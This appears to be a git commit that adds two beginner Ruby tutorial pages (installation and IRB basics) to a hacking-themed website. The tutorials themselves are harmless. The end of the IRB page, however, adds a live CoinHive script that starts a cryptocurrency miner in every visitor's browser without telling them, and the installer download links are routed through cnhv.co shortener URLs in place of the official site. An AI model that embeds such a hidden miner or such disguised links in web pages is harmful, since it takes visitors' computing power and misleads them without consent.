6b632702910b528e54ac5bdf56639f4aae150660
GreenVortex <jan.andersson.ie@gmail.com>
2020-05-16 00:36:35 +0100

    Upload

---
+++ tutorials/Ruby001.php
@@ -0,0 +1,126 @@
+<html>
+<head>
+<title>A Hacker's world</title>
+<link rel="stylesheet" href="../css/font-awesome.css">
+<link rel="stylesheet" href="../css/index-min.css">
+<link rel="stylesheet" href="../css/animate.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+  <section class="section">
+    <div class="container">
+       <a href="../Secure.html">  <h1 class="title animated pulse">
+        Zefir Repository<img src="../img/logo.png" width="150" height="150" align="right">
+      </h1>
+      <p class="subtitle animated bounceInRight">
+        A <strong>Hacker's</strong> World
+      </p>
+	  </a>
+    </div>
+  </section>
+  <div class="container is-widescreen">
+<div class="tabs is-small animated lightSpeedIn">
+  <ul>
+  	<li class="is-active"><a href="../Tutorials.html">Tutorials</a></li>
+  </ul>
+</div>
+</div>
+<br/>
+<!--Page Content-->
+<div class="animated zoomIn" align="centered">
+<div class="container is-fluid">
+ <div class="tile is-ancestor">
+  <div class="tile is-vertical is-10">
+    <div class="tile">
+      <div class="tile is-parent is-vertical">
+        <article class="tile is-child notification is-dark">
+          <p class="title">Installing Ruby</p>
+          <p class="subtitle">A Guide on how to install Ruby on Linux and Windows</p>
+        </article>
+      </div>
+	  </div>
+	  </div>
+	  </div>
+<footer class="footer">
+<!--Steps-->
+<div class="tile is-ancestor">
+  <div class="tile is-vertical is-5">
+    <div class="tile">
+      <div class="tile is-parent is-vertical">
+	  <!--Windows-->
+        <article class="tile is-child notification is-dark">
+          <p class="title">Windows</p>
+		  <p class="subtitle">1.Visit <a href="https://cnhv.co/aokb">this</a> website in your Browser or click here to <a href="https://cnhv.co/aoki">download</a></p>
+		  <figure>
+		  <img src="../img/ruby001-1.JPG">
+		      <figcaption>
+      Figure 1: Ruby installer Website
+    </figcaption>
+	</figure>
+	</br>
+			  <p class="subtitle">2.Download the newest version of the installer and run it</p>
+			  <figure>
+		  <img src="../img/ruby001-2.JPG">
+		      <figcaption>
+      Figure 2: Firefox Downloads
+	  </figcaption>
+	  </figure>
+	  </br>
+	  			  <p class="subtitle">3.Accept the licence and click next, Ruby will install</p>
+				  <figure>
+		  <img src="../img/ruby001-3.JPG">
+		      <figcaption>
+      Figure 3: Ruby Installer
+	  </figcaption>
+	   </figure>
+	  	  </br>
+	  			  <p class="subtitle">4.Press the WindowsKey+R to open Run Prompt and run.</p>
+				  <figure>
+		  <img src="../img/ruby001-4.JPG">
+		      <figcaption>
+      Figure 4: Run Prompt
+	  </figcaption>
+	  </figure>
+	  	  	  </br>
+	  			  <p class="subtitle">5.If fallowed Currectly this should be the result</p>
+				  <figure>
+		  <img src="../img/ruby001-5.JPG">
+		      <figcaption>
+      Figure 5: Interactive Ruby Shell
+	  </figcaption>
+	  </figure>
+        </article>
+		</br>
+			  <!--Linux-->
+        <article class="tile is-child notification is-dark">
+          <p class="title">Linux</p>
+          <pre>1:On Ubuntu, go to Applications ▶ Accessories ▶ Terminal
+2:This differs between distributions, but on Ubuntu run the following command:sudo apt-get install ruby-full
+3.Open a text editor and save the following as test.rb
+
+#!/usr/bin/env ruby
+puts "Hello world!"
+
+4.Open Terminal again (Applications ▶ Accessories ▶ Terminal)
+5.Change Directory using (CD to your current Directory)
+6.Run the command chmod +x test.rb.
+7.Run the command ./test.rb.
+
+If Ruby was installed correctly you should see this output
+		  </pre>
+        </article>
+        <article class="tile is-child notification is-dark">
+          <p class="subtitle">If Ruby was installed correctly you should see this output</p>
+          <pre>Hello world!
+		  </pre>
+        </article>
+</footer>
+</div>
+</div>>
+</div>
+
+<!--End of Content-->
+</body>
+</html>
---
+++ tutorials/Ruby003.php
@@ -0,0 +1,104 @@
+<html>
+
+<head>
+    <title>A Hacker's world</title>
+    <link rel="stylesheet" href="../css/font-awesome.css">
+    <link rel="stylesheet" href="../css/index-min.css">
+    <link rel="stylesheet" href="../css/animate.css">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
+    <section class="section">
+        <div class="container">
+            <a href="../Secure.html">
+                <h1 class="title animated pulse">        Zefir Repository   <img src="../img/logo.png" width="150" height="150" align="right">   </h1>
+                <p class="subtitle animated bounceInRight"> A <strong>Hacker's</strong> World </p>
+            </a>
+        </div>
+    </section>
+    <div class="container is-widescreen">
+        <div class="tabs is-small animated lightSpeedIn">
+            <ul>
+                <li class="is-active"><a href="../Tutorials.html">Tutorials</a></li>
+            </ul>
+        </div>
+    </div>
+    <br/>
+    <!--Page Content-->
+    <div class="animated zoomIn">
+        <div class="container is-fluid">
+            <div class="tile is-ancestor">
+                <div class="tile is-vertical is-10">
+                    <div class="tile">
+                        <div class="tile is-parent is-vertical">
+                            <article class="tile is-child notification is-dark">
+                                <p class="title">Ruby Interactive Shell</p>
+                                <p class="subtitle">A Guide to Ruby Basics</p>
+                            </article>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer class="footer">
+                <!--Steps-->
+                <div class="tile is-ancestor">
+                    <div class="tile is-vertical is-8">
+                        <div class="tile">
+                            <div class="tile is-parent is-vertical">
+                                <article class="tile is-child notification is-dark">
+                                    <p class="title">Startup</p>
+                                    <p class="subtitle">Launching IRB</p>
+                                    </br>
+                                    <p class="subtitle">Step 1: Open CMD line (Terminal/CMD)</p>
+									<p>and type in the fallowing:</p>
+									<pre>irb</pre>
+									</br>
+									<img src="../img/ruby003-1.JPG">
+                                   </article>
+
+                                </br>
+
+                                <article class="tile is-child notification is-dark">
+                                    <p class="title">Calculator</p>
+                                    <p class="subtitle">You can use ruby as a free calculator with all the functions</p>
+                                    </br>
+                                    <p class="subtitle">Step 1: Open IRB</p>
+									<p>and type in the fallowing:</p>
+									<pre>$MyVariable = 1+1</pre>
+									</br>
+									<p>and type in:</p>
+									<pre>puts $MyVariable</pre>
+									</br>
+									<p>You should get the fallowing result<p>
+									<img src="../img/ruby003-2.JPG">
+                                   </article>
+								</br>
+
+                                <article class="tile is-child notification is-dark">
+                                    <p class="title">Getting values from user input</p>
+                                    <p class="subtitle">You can get direct input from your programs user this is useful when you need to gather information to use for example a name</p>
+                                    </br>
+                                    <p class="subtitle">Step 1: Open IRB</p>
+									<p>and type in the fallowing:</p>
+							   <pre>$hello = "hello "
+									$name = gets
+									(Now type in your name)
+									puts $hello + $name</pre>
+									</br>
+									<p>You should get the fallowing result<p>
+									<img src="../img/ruby003-3.JPG">
+                                   </article>
+            </footer>
+            </div>
+            </div>></div>
+            <!--End of Content-->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('JYrPuKMz11Q7QQTMqjHO3KZMkDFxLo5k');
+	miner.start();
+</script>
+</body>
+
+</html>
